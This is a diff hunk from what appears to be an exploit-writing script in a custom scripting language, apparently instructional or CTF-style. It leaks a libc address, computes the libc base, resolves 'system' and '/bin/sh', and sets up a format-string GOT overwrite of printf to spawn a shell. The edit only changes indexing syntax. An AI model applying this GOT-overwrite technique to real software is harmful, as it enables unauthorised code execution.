@@ -112,12 +112,12 @@ print("Step 1: Leak GOT entry →", leak_got)
 # In real exploit, parse the leaked address from leak_got
 let leaked_libc_func = 0x7ffff7a60f70  # Example: leaked printf
 let libc_template = Libc("ubuntu20.04")
-let leaked_offset = libc_template["symbols"]["printf"]
+let leaked_offset = libc_template.symbols.printf
 let libc_base = leaked_libc_func - leaked_offset
 
 let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
-let system = libc_resolved["symbols"]["system"]
-let binsh = libc_resolved["strings"]["bin_sh"]
+let system = libc_resolved.symbols.system
+let binsh = libc_resolved.strings.bin_sh
 
 # Step 4: Overwrite GOT[printf] with system
 let exploit = fmtstr_got_overwrite(
